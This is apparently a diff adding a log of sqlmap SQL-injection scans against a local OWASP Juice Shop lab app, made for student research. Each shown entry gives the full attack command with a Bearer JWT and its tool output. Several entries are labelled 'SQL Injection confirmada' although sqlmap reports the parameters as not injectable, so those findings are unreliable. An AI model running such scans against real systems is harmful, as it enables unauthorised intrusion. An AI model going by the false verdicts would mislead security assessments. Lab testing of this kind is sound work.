+  [00:21:19] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:19] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:19] [INFO] testing 'Generic inline queries'
+  [00:21:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:19] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:19] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:19] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:20] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:20] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:20] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  
+  [*] ending @ 00:21:20 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[26/41] Testando: rest_basket_large_id
+  Método:    GET
+  Path:      /rest/basket/999999
+  Descrição: Obter carrinho com ID grande (teste path param)
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/rest/basket/999999" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em rest_basket_large_id
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:21 /2026-06-01/
+  
+  [00:21:21] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:21] [INFO] loading tamper module 'space2comment'
+  [00:21:21] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:21] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:21] [INFO] flushing session file
+  [00:21:21] [INFO] testing connection to the target URL
+  [00:21:21] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:21] [INFO] testing if the target URL content is stable
+  [00:21:22] [INFO] target URL content is stable
+  [00:21:22] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:22] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:22] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:22] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:22] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:22] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:22] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:22] [INFO] testing 'Generic inline queries'
+  [00:21:22] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:23] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:23] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:23] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:23] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:23] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:23] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:23] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  
+  [*] ending @ 00:21:23 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[27/41] Testando: api_basket_items_create
+  Método:    POST
+  Path:      /api/BasketItems
+  Descrição: Adicionar item ao carrinho
+  Auth:      Sim (Bearer JWT)
+  Body:      {"ProductId": 1, "BasketId": "1", "quantity": 1}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/BasketItems" --method=POST --data='{"ProductId": 1, "BasketId": "1", "quantity": 1}' --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para api_basket_items_create
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[,]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:24 /2026-06-01/
+  
+  [00:21:24] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:24] [INFO] loading tamper module 'space2comment'
+  [00:21:24] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.7258.5 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:25] [INFO] flushing session file
+  [00:21:25] [INFO] testing connection to the target URL
+  [00:21:25] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:21:25] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:25] [INFO] testing if the target URL content is stable
+  [00:21:25] [INFO] target URL content is stable
+  [00:21:25] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:21:25] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 3 times
+  
+  [*] ending @ 00:21:25 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[28/41] Testando: api_addresses_list
+  Método:    GET
+  Path:      /api/Addresss
+  Descrição: Listar endereços
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Addresss" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_addresses_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  ["]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:26 /2026-06-01/
+  
+  [00:21:26] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:26] [INFO] loading tamper module 'space2comment'
+  [00:21:26] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:26] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:26] [INFO] flushing session file
+  [00:21:26] [INFO] testing connection to the target URL
+  [00:21:26] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:26] [INFO] testing if the target URL content is stable
+  [00:21:27] [INFO] target URL content is stable
+  [00:21:27] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:27] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:27] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:27] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:27] [WARNING] reflective value(s) found and filtering out
+  [00:21:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:27] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:27] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:27] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:27] [INFO] testing 'Generic inline queries'
+  [00:21:27] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:28] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:28] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:28] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:28] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:28] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:28] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:28] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 73 times
+  
+  [*] ending @ 00:21:28 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[29/41] Testando: api_addresses_get_by_id
+  Método:    GET
+  Path:      /api/Addresss/1
+  Descrição: Obter endereço por ID
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Addresss/1" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_addresses_get_by_id
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  [.]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:29 /2026-06-01/
+  
+  [00:21:29] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:29] [INFO] loading tamper module 'space2comment'
+  [00:21:29] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:29] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:29] [INFO] flushing session file
+  [00:21:29] [INFO] testing connection to the target URL
+  [00:21:29] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+  [00:21:29] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:29] [INFO] testing if the target URL content is stable
+  [00:21:29] [INFO] target URL content is stable
+  [00:21:29] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:29] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:30] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:30] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:30] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:30] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:30] [INFO] testing 'Generic inline queries'
+  [00:21:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:30] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:30] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:30] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:30] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:30] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:30] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:30] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:30] [WARNING] HTTP error codes detected during run:
+  400 (Bad Request) - 76 times
+  
+  [*] ending @ 00:21:30 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[30/41] Testando: api_addresses_create
+  Método:    POST
+  Path:      /api/Addresss
+  Descrição: Criar endereço
+  Auth:      Sim (Bearer JWT)
+  Body:      {"UserId": 1, "fullName": "Test User", "mobileNum": 12345678901, "zipCode": "12345", "streetAddress": "123 Test St", "city": "TestCity", "state": "TS", "country": "TestCountry"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Addresss" --method=POST --data='{"UserId": 1, "fullName": "Test User", "mobileNum": 12345678901, "zipCode": "12345", "streetAddress": "123 Test St", "city": "TestCity", "state": "TS", "country": "TestCountry"}' --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para api_addresses_create
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . ["]     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:31 /2026-06-01/
+  
+  [00:21:31] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:31] [INFO] loading tamper module 'space2comment'
+  [00:21:31] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:31] [INFO] flushing session file
+  [00:21:31] [INFO] testing connection to the target URL
+  [00:21:31] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:21:31] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:31] [INFO] testing if the target URL content is stable
+  [00:21:31] [INFO] target URL content is stable
+  [00:21:31] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:21:31] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 3 times
+  
+  [*] ending @ 00:21:31 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[31/41] Testando: api_cards_list
+  Método:    GET
+  Path:      /api/Cards
+  Descrição: Listar cartões de pagamento
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Cards" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_cards_list
